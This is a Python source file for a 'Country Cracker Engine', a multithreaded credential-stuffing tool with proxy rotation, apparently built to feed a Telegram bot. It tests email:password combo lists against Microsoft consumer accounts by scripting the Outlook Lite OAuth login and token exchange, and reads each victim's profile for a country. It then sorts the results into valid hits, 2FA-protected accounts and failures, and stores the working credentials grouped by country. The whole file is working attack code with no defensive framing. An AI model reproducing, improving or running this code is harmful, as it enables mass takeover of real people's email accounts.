#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Country Cracker Engine - Filter and Crack by Country
Advanced country-based filtering with geolocation detection
"""

import os
import re
import time
import threading
import uuid
import random
import requests
import asyncio
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from collections import defaultdict

# Configure logging
logger = logging.getLogger(__name__)

# ────────────────────────────────────────────────
# 🌍 COUNTRY KICKER FUNCTION
# ────────────────────────────────────────────────

def country_kicker(json_data):
    """
    Extract country information from JSON profile data
    Returns country code or country name
    
    Supports multiple data formats:
    - Microsoft profile JSON
    - Outlook API responses
    - Custom location objects
    """
    try:
        if isinstance(json_data, dict):
            # Check nested account structure
            if "accounts" in json_data and isinstance(json_data["accounts"], list):
                for account in json_data["accounts"]:
                    if "location" in account and account["location"]:
                        return str(account["location"]).strip()
            
            # Check location field (could be string or dict)
            if "location" in json_data and json_data["location"]:
                location = json_data["location"]
                if isinstance(location, str):
                    # Split by comma and get last part (usually country)
                    parts = [p.strip() for p in location.split(',')]
                    return parts[-1] if parts else ""
                elif isinstance(location, dict):
                    # Try common country field names
                    for key in ['country', 'countryOrRegion', 'countryCode', 'name']:
                        if key in location and location[key]:
                            return str(location[key]).strip()
            
            # Check top-level country fields
            for key in ['country', 'countryOrRegion', 'countryCode', 'countryName']:
                if key in json_data and json_data[key]:
                    return str(json_data[key]).strip()
            
            # Check location city country format
            if "city" in json_data and "country" in json_data:
                country = json_data.get("country", "")
                if country:
                    return str(country).strip()
    except Exception as e:
        logger.debug(f"Error in country_kicker: {e}")
        pass
    
    return "Unknown"


# ────────────────────────────────────────────────
# 🔐 PROXY MANAGER
# ────────────────────────────────────────────────

class ProxyManager:
    def __init__(self, proxy_file=None):
        self.proxies = []
        self.lock = Lock()
        if proxy_file and os.path.exists(proxy_file):
            self.load_proxies(proxy_file)
    
    def load_proxies(self, proxy_file):
        try:
            with open(proxy_file, 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]
            for line in lines:
                if ':' in line:
                    try:
                        parts = line.split(':')
                        if len(parts) == 2:
                            proxy = {
                                'http': f'http://{parts[0]}:{parts[1]}',
                                'https': f'http://{parts[0]}:{parts[1]}'
                            }
                            self.proxies.append(proxy)
                        elif len(parts) == 4:
                            proxy = {
                                'http': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}',
                                'https': f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
                            }
                            self.proxies.append(proxy)
                    except ValueError as ve:
                        logger.debug(f"Invalid proxy format: {line} - {ve}")
                        continue
        except FileNotFoundError:
            logger.warning(f"Proxy file not found: {proxy_file}")
        except IOError as ie:
            logger.error(f"Error reading proxy file {proxy_file}: {ie}")
        except Exception as e:
            logger.error(f"Unexpected error loading proxies: {e}")
    
    def get_random_proxy(self):
        try:
            with self.lock:
                if not self.proxies:
                    return None
                return random.choice(self.proxies)
        except Exception as e:
            logger.error(f"Error getting random proxy: {e}")
            return None
    
    def has_proxies(self):
        return len(self.proxies) > 0
    
    def count(self):
        return len(self.proxies)


# ────────────────────────────────────────────────
# 🌍 COUNTRY CHECKER (Advanced)
# ────────────────────────────────────────────────

class CountryChecker:
    """Check email/password combos and filter by country"""
    
    def __init__(self, target_countries=None, proxy_manager=None, max_retries=2):
        """
        target_countries: List of countries to filter by (e.g., ['US', 'UK', 'Canada'])
        If None, returns all with country info
        max_retries: Number of times to retry on network errors
        """
        self.uuid = str(uuid.uuid4())
        self.target_countries = target_countries or []
        self.proxy_manager = proxy_manager
        self.max_retries = max_retries
    
    def get_session(self):
        try:
            session = requests.Session()
            if self.proxy_manager and self.proxy_manager.has_proxies():
                proxy = self.proxy_manager.get_random_proxy()
                if proxy:
                    session.proxies.update(proxy)
            return session
        except Exception as e:
            logger.error(f"Error creating session: {e}")
            return None
    
    def check(self, email, password):
        """Check combo and return country info"""
        for attempt in range(self.max_retries + 1):
            session = None
            try:
                session = self.get_session()
                if not session:
                    return {"status": "ERROR", "country": "N/A", "email": email}
                
                # Step 1: Get IDP
                try:
                    url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
                    headers1 = {
                        "X-OneAuth-AppName": "Outlook Lite",
                        "X-Office-Version": "3.11.0-minApi24",
                        "X-CorrelationId": self.uuid,
                        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                        "Host": "odc.officeapps.live.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip"
                    }
                    r1 = session.get(url1, headers=headers1, timeout=10, verify=False)
                    if "MSAccount" not in r1.text:
                        return {"status": "BAD", "country": "N/A", "email": email}
                except requests.exceptions.Timeout:
                    if attempt < self.max_retries:
                        logger.debug(f"Timeout on step 1 for {email}, retrying...")
                        continue
                    return {"status": "ERROR", "country": "N/A", "email": email}
                except requests.exceptions.ConnectionError:
                    if attempt < self.max_retries:
                        logger.debug(f"Connection error on step 1 for {email}, retrying...")
                        continue
                    return {"status": "ERROR", "country": "N/A", "email": email}
                
                # Step 2: OAuth authorization
                try:
                    url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
                    headers2 = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    }
                    r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=10, verify=False)
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                    if attempt < self.max_retries:
                        logger.debug(f"Network error on step 2 for {email}, retrying...")
                        continue
                    return {"status": "ERROR", "country": "N/A", "email": email}
                
                url_post = re.search(r'urlPost":"([^"]+)"', r2.text)
                ppft = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
                if not url_post or not ppft:
                    return {"status": "BAD", "country": "N/A", "email": email}
                
                post_url = url_post.group(1).replace("\\/", "/")
                ppft_val = ppft.group(1)
                
                # Step 3: Login
                try:
                    login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft_val}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
                    headers3 = {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Referer": r2.url
                    }
                    r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=10, verify=False)
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                    if attempt < self.max_retries:
                        logger.debug(f"Network error on step 3 for {email}, retrying...")
                        continue
                    return {"status": "ERROR", "country": "N/A", "email": email}
                
                txt3 = r3.text.lower()
                if "incorrect" in txt3 or "error" in txt3:
                    return {"status": "BAD", "country": "N/A", "email": email}
                if "identity/confirm" in txt3 or "consent" in txt3:
                    return {"status": "2FA", "country": "N/A", "email": email}
                
                location = r3.headers.get("Location", "")
                if not location:
                    return {"status": "BAD", "country": "N/A", "email": email}
                
                code_match = re.search(r'code=([^&]+)', location)
                if not code_match:
                    return {"status": "BAD", "country": "N/A", "email": email}
                
                code = code_match.group(1)
                mspcid = session.cookies.get("MSPCID", "")
                if not mspcid:
                    return {"status": "BAD", "country": "N/A", "email": email}
                
                cid = mspcid.upper()
                
                # Step 4: Get token
                try:
                    token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
                    r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                     data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10, verify=False)
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                    if attempt < self.max_retries:
                        logger.debug(f"Network error on step 4 for {email}, retrying...")
                        continue
                    return {"status": "ERROR", "country": "N/A", "email": email}
                
                if "access_token" not in r4.text:
                    return {"status": "BAD", "country": "N/A", "email": email}
                
                try:
                    access_token = r4.json()["access_token"]
                except (ValueError, KeyError) as e:
                    logger.debug(f"Error parsing token response: {e}")
                    return {"status": "ERROR", "country": "N/A", "email": email}
                
                # Step 5: Get profile with country info
                country = "Unknown"
                try:
                    profile_headers = {
                        "User-Agent": "Outlook-Android/2.0",
                        "Authorization": f"Bearer {access_token}",
                        "X-AnchorMailbox": f"CID:{cid}"
                    }
                    r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                    headers=profile_headers, timeout=10, verify=False)
                    if r5.status_code == 200:
                        profile = r5.json()
                        country = country_kicker(profile)
                except requests.exceptions.Timeout:
                    logger.debug(f"Timeout getting profile for {email}")
                except requests.exceptions.ConnectionError:
                    logger.debug(f"Connection error getting profile for {email}")
                except Exception as e:
                    logger.debug(f"Error extracting country info: {e}")
                
                # Check if country matches target
                if self.target_countries:
                    country_matches = any(
                        target.lower() in country.lower() or country.lower() in target.lower()
                        for target in self.target_countries
                    )
                    if not country_matches:
                        return {"status": "COUNTRY_MISMATCH", "country": country, "email": email}
                
                return {
                    "status": "HIT",
                    "country": country,
                    "email": email,
                    "password": password
                }
            
            except requests.exceptions.RequestException as e:
                if attempt < self.max_retries:
                    logger.debug(f"Request error for {email} (attempt {attempt + 1}/{self.max_retries + 1}): {e}")
                    continue
                else:
                    logger.error(f"Request error for {email} after {self.max_retries + 1} attempts: {e}")
                    return {"status": "ERROR", "country": "N/A", "email": email}
            
            except Exception as e:
                logger.error(f"Unexpected error checking {email}: {e}", exc_info=False)
                return {"status": "ERROR", "country": "N/A", "email": email}
            
            finally:
                try:
                    if session:
                        session.close()
                except:
                    pass
        
        return {"status": "ERROR", "country": "N/A", "email": email}


# ────────────────────────────────────────────────
# 🌍 COUNTRY CRACKER SCANNER ENGINE
# ────────────────────────────────────────────────

class CountryCrackerEngine:
    """Main engine for country-based cracking"""
    
    def __init__(self, combos, target_countries=None, threads=30, chat_id=None, 
                 bot_instance=None, combo_file=None, loop=None):
        self.combos = combos
        self.target_countries = target_countries or []
        self.threads = threads
        self.chat_id = chat_id
        self.bot_instance = bot_instance
        self.combo_file = combo_file
        self.loop = loop or asyncio.get_event_loop()
        self.running = True
        self.lock = Lock()
        self.start_time = time.time()
        
        self.stats = {
            'total': len(combos),
            'checked': 0,
            'hits': 0,
            'country_matched': 0,
            'country_mismatched': 0,
            '2fa': 0,
            'bad': 0,
            'errors': 0,
            'start_time': self.start_time,
            'cpm': 0,
            'elapsed': 0,
            'combo_file': combo_file
        }
        
        self.hits_by_country = defaultdict(list)
        self.mismatches_by_country = defaultdict(list)
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = (self.stats['checked'] / elapsed * 60) if elapsed > 0 else 0
            return {
                **self.stats,
                'elapsed': elapsed,
                'cpm': cpm
            }
    
    def is_running(self):
        return self.running
    
    def stop(self):
        self.running = False
    
    def _process_combo(self, combo):
        if not self.running:
            return
        
        try:
            email, password = combo.split(':', 1)
            email = email.strip()
            password = password.strip()
            
            checker = CountryChecker(target_countries=self.target_countries, proxy_manager=None)
            result = checker.check(email, password)
            
            country = result.get("country", "Unknown")
            status = result.get("status", "ERROR")
            
            with self.lock:
                self.stats['checked'] += 1
                
                if status == "ERROR":
                    self.stats['errors'] += 1
                elif status == "BAD":
                    self.stats['bad'] += 1
                elif status == "2FA":
                    self.stats['2fa'] += 1
                elif status == "COUNTRY_MISMATCH":
                    self.stats['country_mismatched'] += 1
                    self.mismatches_by_country[country].append(f"{email}:{password} | {country}")
                elif status == "HIT":
                    self.stats['hits'] += 1
                    self.stats['country_matched'] += 1
                    self.hits_by_country[country].append(f"{email}:{password} | {country}")
        
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
                self.stats['checked'] += 1
    
    def run_checks(self):
        """Execute all checks"""
        self.start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self._process_combo, combo) for combo in self.combos]
            for future in as_completed(futures):
                if not self.running:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                try:
                    future.result()
                except:
                    pass
        
        self.running = False


if __name__ == "__main__":
    print("🌍 Country Cracker Engine v1.0")
    print("Country-based filtering and cracking module")
